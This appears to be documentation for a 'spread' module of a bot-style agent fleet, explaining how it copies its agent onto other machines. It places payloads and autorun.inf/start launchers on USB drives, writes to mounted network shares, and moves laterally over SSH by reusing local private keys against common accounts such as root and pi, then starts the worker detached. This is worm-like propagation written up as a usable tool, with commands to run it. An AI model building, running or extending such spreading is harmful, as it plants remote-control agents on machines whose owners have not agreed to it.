# Spread: USB, shares, and nearby hosts

`spread` stages the agent payload where another machine can pick it up, and
tries SSH-key reuse on the local segment. It is taskable through `mods/spread`.

## Payload

A directory containing:

- `agentd` (`agentd.exe` on Windows) — required
- `config.toml` — required, channel/relay for the new host
- `coordinator.pub` — required; lets the new host verify tasks

That is the whole payload. Each host generates its own `agent.key` and per-agent `enc.key` on first start and enrols by heartbeat. No per-host files, no key rolling.

Optional: `enrolment.grant` (explicit identity), `agent.key` (clone), `enc.key` (shared fallback).

Include a **grant** so the new host generates its own key and route tag. Cloning
`agent.key` works but two hosts then share one route tag and task epoch, so the
database duplicate-suppression can drop one host's results for the same task.
`adminctl agents grant` creates a single-use grant; carry one per target.

## USB

```sh
spread --payload /opt/af-payload --state /var/lib/agent-fleet --mode usb
spread --mount-root /media/user --dry-run
```

Linux finds mounts from `/proc/mounts` and `/sys/block/*/removable`; Windows uses
WMI `DriveType=2`; macOS lists `/Volumes`. Explicit `--mount-root` entries are
trusted.

For each drive it writes `agentfleet/` with the payload, `start.sh`,
`start.command`, `start.cmd`, and `autorun.inf`, then `.agentfleet-id` at the
drive root. The marker makes a second pass a no-op (`--force` overrides).

Launchers copy the keys and config into `~/.agent-fleet` (`%APPDATA%` on
Windows), start the worker detached (`setsid`/`nohup`, `start`), and honour a
pid file.

Honest limits: **nothing auto-runs on modern Linux**. A `.desktop`/`.command`
file needs a click, and `autorun.inf` is ignored for non-optical Windows media
unless the AutoPlay policy allows it. USB spread is therefore "payload is on the
drive and one click from running", not "exploits the host by itself".

## Mounted shares

`--mode shares` (part of `all`) writes to auto-detected `cifs`/`smb3`/`nfs`/
`nfs4`/`sshfs` mounts that are not read-only, under
`<share>/agentfleet-<host-id-prefix>/`. Explicit `--share DIR` is trusted. This
is for "remote hard drives" already mounted on the bot.

## Local network

```sh
spread --payload /opt/af-payload --state /var/lib/agent-fleet --mode lan --max-hosts 16
```

1. Reads the neighbour/ARP table (`ip neigh`, `/proc/net/arp`, `arp -a`).
2. Probes TCP 22 (`--port`) with a 2 s timeout.
3. Tries each configured/`~/.ssh` key against the current user first, then
   `root`, `ubuntu`, `pi`, `admin`, `debian`.
4. On success: checks `~/.agent-fleet/.spread`, `mkdir`, `scp` the staged
   payload, `chmod`, starts the worker detached, writes the marker.

Per-host outcomes are `staged`, `skipped`, or `error` in the JSON report; an
`error` makes the process exit 1. With no SSH key or port 22 closed the host is
skipped, not failed.

Limits: same L2 segment only; no SMB/Windows share credentials are guessed; no
firewall traversal; the client needs `ssh` and `scp` (OpenSSH is present on
Linux/macOS, and on Windows 10+ as an optional feature). Windows discovery is
code-reviewed, not built in this sandbox.

## Safety

- Payload staging never touches existing drive content outside `agentfleet/`
  and the two marker/launcher files.
- A target is tested writable first; read-only media is reported, not half-written.
- `scp` uses `BatchMode=yes`; a password prompt never blocks a bot.
- `--dry-run` lists mounts, shares, neighbours, and open ports without writing.
